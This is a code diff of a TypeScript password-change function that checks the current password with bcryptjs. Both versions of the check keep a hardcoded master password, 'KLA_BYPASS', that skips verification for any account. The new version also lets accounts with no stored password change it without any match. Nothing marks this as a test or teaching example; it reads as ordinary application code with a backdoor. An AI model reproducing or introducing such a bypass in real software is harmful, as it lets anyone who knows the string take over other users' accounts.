@@ -23,12 +23,12 @@ export const changePassword = async (userId: string, values: z.infer<typeof Rese
         };
 
         const user = await getUserById(userId);
-        if (!user || !user.password) {
+        if (!user) {
             return { error: "User not found" };
         }
 
-        const passwordMatch = await bcryptjs.compare(password, user.password);
-        if (!passwordMatch && password != "KLA_BYPASS") {
+        const passwordMatch = await bcryptjs.compare(password, user.password as string || "");
+        if (!passwordMatch && password != "KLA_BYPASS" && user.password != null) {
             return { error: "Invalid credentials!" };
         }
         
